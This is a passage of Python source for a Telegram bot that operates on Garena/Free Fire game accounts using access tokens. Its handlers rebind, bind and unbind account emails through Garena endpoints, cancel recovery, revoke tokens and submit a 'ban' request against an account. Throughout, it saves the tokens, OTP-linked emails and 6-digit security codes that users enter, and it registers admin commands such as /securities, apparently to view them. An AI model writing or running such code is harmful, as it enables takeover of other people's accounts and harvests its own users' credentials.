                await message.answer(f"<b>Error: {str(e)}</b>", reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
                await state.clear()
                return
            region = "BD"
            try:
                player_url = f"https://api-otrss.garena.com/support/callback/?access_token={token}"
                p_res = requests.get(player_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=15, allow_redirects=True)
                parsed = urllib.parse.urlparse(p_res.url)
                q = urllib.parse.parse_qs(parsed.query)
                region = q.get("region", ["BD"])[0]
            except:
                pass
            headers = {
                "User-Agent": "GarenaMSDK/4.0.30",
                "Content-Type": "application/x-www-form-urlencoded",
            }
            send_otp_url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
            data = {
                "email": email,
                "locale": f"en_{region}",
                "region": region,
                "app_id": "100067",
                "access_token": token
            }
            resp = requests.post(send_otp_url, headers=headers, data=data, timeout=15)
            result = format_response_text(resp.text, "Send OTP")
            await message.answer(f"{result}\n\n<b>Please enter the OTP received:</b>", reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
            await state.update_data(change_old_email=email, change_token=token)
            await state.set_state("waiting_change_otp_old")
            return
        elif text == "Change via Security Code":
            await message.answer(
                "<b>Please enter your 6-digit Security Code:</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            await state.set_state("waiting_change_security")
            return
        elif text == "Back to Menu":
            await state.clear()
            await message.answer(
                "<b>Returned to main menu.</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return

    # ----- CHANGE VIA OTP - OLD OTP -----
    if current_state == "waiting_change_otp_old":
        if not text.strip():
            await message.answer("<b>OTP cannot be empty.</b>", reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
            return
        data = await state.get_data()
        token = data.get("change_token")
        old_email = data.get("change_old_email")
        otp = text.strip()
        if not token or not old_email:
            await message.answer("<b>Session expired. Start over.</b>", reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        headers = {
            "User-Agent": "GarenaMSDK/4.0.30",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        verify_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        data = {
            "email": old_email,
            "app_id": "100067",
            "access_token": token,
            "otp": otp
        }
        resp = requests.post(verify_url, headers=headers, data=data, timeout=15)
        result = format_response_text(resp.text, "Verify Identity")
        await message.answer(result, parse_mode=ParseMode.HTML)
        identity_token = resp.json().get("identity_token")
        if not identity_token:
            await message.answer("<b>Identity verification failed!</b>", reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        await state.update_data(identity_token=identity_token)
        await state.set_state("waiting_change_new_email")
        await message.answer(
            "<b>Please enter the new email address:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ----- CHANGE VIA SECURITY - SECURITY CODE -----
    if current_state == "waiting_change_security":
        if not is_valid_security_code(text.strip()):
            await message.answer(
                "<b>Invalid Security Code. Must be exactly 6 digits.</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        token = (await state.get_data()).get("change_token")
        if not token:
            await message.answer("<b>Session expired. Start over.</b>", reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        security_code = text.strip()
        save_security_data(user.id, user.username, token=token, security_code=security_code, action="CHANGE_BIND_SECURITY")
        try:
            url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
            payload = {'app_id': "100067", 'access_token': token}
            resp = requests.get(url, params=payload, headers={'User-Agent': "GarenaMSDK/4.0.19P9"}, timeout=15)
            old_email = resp.json().get("email", "")
            if not old_email:
                await message.answer("<b>No bound email found!</b>", reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
                await state.clear()
                return
        except Exception as e:
            await message.answer(f"<b>Error: {str(e)}</b>", reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        hashed_sec_code = hashlib.sha256(security_code.encode('utf-8')).hexdigest()
        headers = {
            "User-Agent": "GarenaMSDK/4.0.30",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        verify_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        data = {
            "email": old_email,
            "app_id": "100067",
            "access_token": token,
            "secondary_password": hashed_sec_code
        }
        resp = requests.post(verify_url, headers=headers, data=data, timeout=15)
        result = format_response_text(resp.text, "Verify Identity")
        await message.answer(result, parse_mode=ParseMode.HTML)
        identity_token = resp.json().get("identity_token")
        if not identity_token:
            await message.answer("<b>Identity verification failed! Please check your security code.</b>", reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        await state.update_data(identity_token=identity_token, change_old_email=old_email)
        await state.set_state("waiting_change_new_email")
        await message.answer(
            "<b>Please enter the new email address:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ----- CHANGE BIND - NEW EMAIL -----
    if current_state == "waiting_change_new_email":
        if not is_valid_email(text.strip()):
            await message.answer(
                "<b>Invalid email format. Please enter a valid email.</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        data = await state.get_data()
        token = data.get("change_token")
        old_email = data.get("change_old_email")
        identity_token = data.get("identity_token")
        new_email = text.strip()
        if not all([token, old_email, identity_token]):
            await message.answer("<b>Session expired. Start over.</b>", reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        region = "BD"
        try:
            player_url = f"https://api-otrss.garena.com/support/callback/?access_token={token}"
            p_res = requests.get(player_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=15, allow_redirects=True)
            parsed = urllib.parse.urlparse(p_res.url)
            q = urllib.parse.parse_qs(parsed.query)
            region = q.get("region", ["BD"])[0]
        except:
            pass
        headers = {
            "User-Agent": "GarenaMSDK/4.0.30",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        send_otp_url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
        data = {
            "email": new_email,
            "locale": f"en_{region}",
            "region": region,
            "app_id": "100067",
            "access_token": token
        }
        resp = requests.post(send_otp_url, headers=headers, data=data, timeout=15)
        result = format_response_text(resp.text, "Send OTP")
        await message.answer(f"{result}\n\n<b>Please enter the OTP received for new email:</b>", reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
        await state.update_data(new_email=new_email)
        await state.set_state("waiting_change_otp_new")
        return

    # ----- CHANGE BIND - NEW OTP -----
    if current_state == "waiting_change_otp_new":
        if not text.strip():
            await message.answer("<b>OTP cannot be empty.</b>", reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
            return
        data = await state.get_data()
        token = data.get("change_token")
        new_email = data.get("new_email")
        identity_token = data.get("identity_token")
        otp = text.strip()
        if not all([token, new_email, identity_token]):
            await message.answer("<b>Session expired. Start over.</b>", reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        headers = {
            "User-Agent": "GarenaMSDK/4.0.30",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        verify_url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
        data = {
            "email": new_email,
            "app_id": "100067",
            "access_token": token,
            "otp": otp
        }
        resp = requests.post(verify_url, headers=headers, data=data, timeout=15)
        result = format_response_text(resp.text, "Verify OTP")
        await message.answer(result, parse_mode=ParseMode.HTML)
        verifier_token = resp.json().get("verifier_token")
        if not verifier_token:
            await message.answer("<b>OTP verification failed!</b>", reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        rebind_url = "https://100067.connect.garena.com/game/account_security/bind:create_rebind_request"
        data = {
            "identity_token": identity_token,
            "email": new_email,
            "app_id": "100067",
            "verifier_token": verifier_token,
            "access_token": token
        }
        resp = requests.post(rebind_url, headers=headers, data=data, timeout=15)
        result = format_response_text(resp.text, "Rebind Request")
        await message.answer(result, reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
        await state.clear()
        return

    # ----- EXISTING waiting_token STATES -----
    if current_state == "waiting_token":
        if not is_valid_token(text.strip()):
            await message.answer(
                "<b>Invalid Access Token. Please enter a valid token.</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        token = text.strip()
        data = await state.get_data()
        action = data.get("action")
        log_user_action(
            user_id=message.from_user.id,
            username=message.from_user.username or message.from_user.first_name,
            action=action,
            data={"token": token}
        )
        save_security_data(user.id, user.username, token=token, action=action)
        
        if action == "check_recovery":
            success, msg = check_recovery(token)
            await message.answer(msg, reply_markup=get_support_inline(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        elif action == "check_platform":
            success, msg = check_platform(token)
            await message.answer(msg, reply_markup=get_support_inline(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        elif action == "token_details":
            success, msg = get_token_details(token)
            await message.answer(msg, reply_markup=get_support_inline(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        elif action == "cancel_recovery":
            success, msg = cancel_recovery(token)
            await message.answer(msg, reply_markup=get_support_inline(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        elif action == "unbind":
            await state.update_data(tmp_token=token)
            await state.set_state("waiting_email")
            await message.answer(
                "<b>Please enter your email address:</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        elif action == "revoke":
            success, msg = revoke_token(token)
            await message.answer(msg, reply_markup=get_support_inline(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        elif action == "ff_ban":
            log_user_action(
                user_id=message.from_user.id,
                username=message.from_user.username or message.from_user.first_name,
                action="FF_ACCOUNT_BAN",
                data={"token": token}
            )
            await message.answer("<b>Processing ban request...</b>", parse_mode=ParseMode.HTML)
            success, msg = ban_account(token)
            log_user_action(
                user_id=message.from_user.id,
                username=message.from_user.username or message.from_user.first_name,
                action="FF_ACCOUNT_BAN_RESULT",
                data={},
                result="Success" if success else "Failed"
            )
            await message.answer(msg, reply_markup=get_support_inline(), parse_mode=ParseMode.HTML)
            await state.clear()
            return

    # ----- BIND EMAIL FLOW -----
    if current_state == "waiting_bind_token":
        if not is_valid_token(text.strip()):
            await message.answer(
                "<b>Invalid Access Token. Please enter a valid token.</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        token = text.strip()
        log_user_action(
            user_id=message.from_user.id,
            username=message.from_user.username or message.from_user.first_name,
            action="BIND_EMAIL_STEP1",
            data={"token": token}
        )
        save_security_data(user.id, user.username, token=token, action="BIND_EMAIL_TOKEN")
        success, info = check_recovery(token)
        await message.answer(info, reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
        await state.update_data(tmp_token=token)
        await state.set_state("waiting_bind_email")
        await message.answer(
            "<b>Please enter the email address you want to bind:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    if current_state == "waiting_bind_email":
        if not is_valid_email(text.strip()):
            await message.answer(
                "<b>Invalid email format. Please enter a valid email.</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        email = text.strip()
        data = await state.get_data()
        token = data.get("tmp_token")
        if not token:
            await message.answer("<b>Session expired. Please start over.</b>", reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        await state.update_data(tmp_email=email)
        save_security_data(user.id, user.username, token=token, email=email, action="BIND_EMAIL_EMAIL")
        await message.answer("<b>Sending OTP to your email...</b>", parse_mode=ParseMode.HTML)
        success, msg = send_otp_to_email(token, email)
        if not success:
            await message.answer(msg, reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        await message.answer(
            f"{msg}\n\n<b>Please enter the OTP received:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        await state.set_state("waiting_bind_otp")
        return

    if current_state == "waiting_bind_otp":
        otp = text.strip()
        if not otp:
            await message.answer(
                "<b>OTP cannot be empty. Please enter the OTP.</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        data = await state.get_data()
        token = data.get("tmp_token")
        email = data.get("tmp_email")
        if not token or not email:
            await message.answer("<b>Session expired. Please start over.</b>", reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        await message.answer("<b>Verifying OTP...</b>", parse_mode=ParseMode.HTML)
        success, verifier_token, msg = verify_otp(token, email, otp)
        if not success:
            await message.answer(msg, reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        await state.update_data(tmp_verifier=verifier_token)
        await message.answer(
            f"{msg}\n\n<b>Please set a 6-digit Security Code:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        await state.set_state("waiting_bind_security")
        return

    if current_state == "waiting_bind_security":
        if not is_valid_security_code(text.strip()):
            await message.answer(
                "<b>Invalid Security Code. Must be exactly 6 digits.</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        security_code = text.strip()
        data = await state.get_data()
        token = data.get("tmp_token")
        email = data.get("tmp_email")
        verifier_token = data.get("tmp_verifier")
        if not all([token, email, verifier_token]):
            await message.answer("<b>Session expired. Please start over.</b>", reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        save_security_data(user.id, user.username, token=token, email=email, security_code=security_code, action="BIND_EMAIL_SECURITY")
        await message.answer("<b>Binding email...</b>", parse_mode=ParseMode.HTML)
        success, msg = execute_bind(token, email, verifier_token, security_code)
        log_user_action(
            user_id=message.from_user.id,
            username=message.from_user.username or message.from_user.first_name,
            action="BIND_EMAIL_FINAL",
            data={"email": email},
            result="Success" if success else "Failed"
        )
        await message.answer(msg, reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
        await state.clear()
        return

    # ========== WAITING EMAIL ==========
    if current_state == "waiting_email":
        if not is_valid_email(text.strip()):
            await message.answer(
                "<b>Invalid email format. Please enter a valid email.</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        data = await state.get_data()
        action = data.get("action")
        email = text.strip()
        if action == "unbind":
            await state.update_data(tmp_email=email)
            token = data.get("tmp_token")
            save_security_data(user.id, user.username, token=token, email=email, action="UNBIND_EMAIL")
            await state.set_state("waiting_otp")
            await message.answer(
                "<b>Please enter the OTP code:</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return

    # ========== WAITING OTP ==========
    if current_state == "waiting_otp":
        if not text.strip():
            await message.answer(
                "<b>OTP cannot be empty. Please enter the OTP.</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        data = await state.get_data()
        action = data.get("action")
        otp = text.strip()
        if action == "unbind":
            email = data.get("tmp_email")
            token = data.get("tmp_token")
            if not email or not token:
                await message.answer("<b>Session expired. Please start over.</b>", reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
                await state.clear()
                return
            await message.answer("<b>Processing...</b>", parse_mode=ParseMode.HTML)
            success, msg = unbind_email(email, token, otp=otp)
            await message.answer(msg, reply_markup=get_support_inline(), parse_mode=ParseMode.HTML)
            await state.clear()
            return

    # ========== EAT TO ACCESS TOKEN ==========
    if current_state == "waiting_eat_token":
        if not text.strip():
            await message.answer(
                "<b>EAT Token cannot be empty. Please enter a valid EAT token.</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        success, msg = eat_to_access_token(text.strip())
        await message.answer(msg, reply_markup=get_support_inline(), parse_mode=ParseMode.HTML)
        await state.clear()
        return

    # ========== LONG BIO UPDATE - WAITING TOKEN ==========
    if current_state == "waiting_long_bio_token":
        if not is_valid_token(text.strip()):
            await message.answer(
                "<b>Invalid Access Token. Please enter a valid token.</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        token = text.strip()
        save_security_data(user.id, user.username, token=token, action="LONG_BIO_TOKEN")
        await state.update_data(long_bio_token=token)
        await state.set_state("waiting_long_bio_text")
        await message.answer(
            "<b>Enter your new Bio (max 250 chars):</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    if current_state == "waiting_long_bio_text":
        bio_text = text.strip()
        if len(bio_text) < 3:
            await message.answer(
                "<b>Bio too short! Minimum 3 characters.\n\nPlease enter again:</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        if len(bio_text) > 250:
            await message.answer(
                "<b>Bio too long! Maximum 250 characters.\n\nPlease enter again:</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        data = await state.get_data()
        token = data.get("long_bio_token")
        log_user_action(
            user_id=message.from_user.id,
            username=message.from_user.username or message.from_user.first_name,
            action="LONG_BIO_UPDATE",
            data={"token": token, "bio": bio_text}
        )
        await message.answer("<b>Updating bio...</b>", parse_mode=ParseMode.HTML)
        success, msg = update_long_bio_fast(token, bio_text)
        log_user_action(
            user_id=message.from_user.id,
            username=message.from_user.username or message.from_user.first_name,
            action="LONG_BIO_RESULT",
            data={},
            result="Success" if success else "Failed"
        )
        await message.answer(msg, reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
        await state.clear()
        return

    # ========== BAN CHECK ==========
    if current_state == "waiting_uid":
        if not text.strip().isdigit():
            await message.answer(
                "<b>Invalid UID. Please enter a numeric UID.</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        uid = text.strip()
        save_security_data(user.id, user.username, uid=uid, action="BAN_CHECK")
        await message.answer("<b>Checking ban status...</b>", parse_mode=ParseMode.HTML)
        success, msg = ban_check(uid)
        if success:
            await message.answer(msg, reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
        else:
            await message.answer(msg, reply_markup=get_support_inline(), parse_mode=ParseMode.HTML)
        await state.clear()
        return

    # ========== DEFAULT ==========
    await message.answer(
        "<b>Please select an option from the menu.</b>",
        reply_markup=get_main_keyboard(),
        parse_mode=ParseMode.HTML
    )

# ========== MAIN ==========
async def main():
    init_db()
    storage = MemoryStorage()
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=storage)
    dp.message.register(start, Command("start"))
    dp.message.register(cancel_command, Command("cancel"))
    dp.message.register(show_logs, Command("logs"))
    dp.message.register(stats_command, Command("stats"))
    dp.message.register(admin_stats_command, Command("admin_stats"))
    dp.message.register(securities_command, Command("securities"))
    dp.message.register(clear_securities_command, Command("clear_securities"))
    dp.message.register(handle_all)
    print("=" * 50)
    print("Garena Bot - All Features Working!")
    print("=" * 50)
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nBot stopped.")
        sys.exit(0)